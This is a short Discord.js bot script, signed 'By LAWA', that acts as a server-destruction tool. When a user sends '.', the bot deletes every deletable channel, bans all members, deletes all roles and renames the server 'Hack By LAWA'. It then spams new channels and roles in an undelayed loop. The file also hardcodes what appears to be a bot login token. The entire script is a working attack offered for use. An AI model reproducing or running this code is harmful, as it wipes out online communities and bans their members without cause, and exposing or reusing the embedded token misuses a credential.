const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ""; 
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Hack By LAWA ");
      setInterval(function() {
        message.guild.createChannel("By Dark Man", "voice");
        message.guild.createChannel("By Dark Man", "text");
        message.guild.createRole({ name: "By Dark Man" });
      });
    }
  }
});
8
client.login("ODI3MDgwNjg1MTk3NDU5NTA3.YGV06Q.TEDmzRPl7jRVcLeVTElQqn7IO1c");
///////By LAWA \\\\\\\
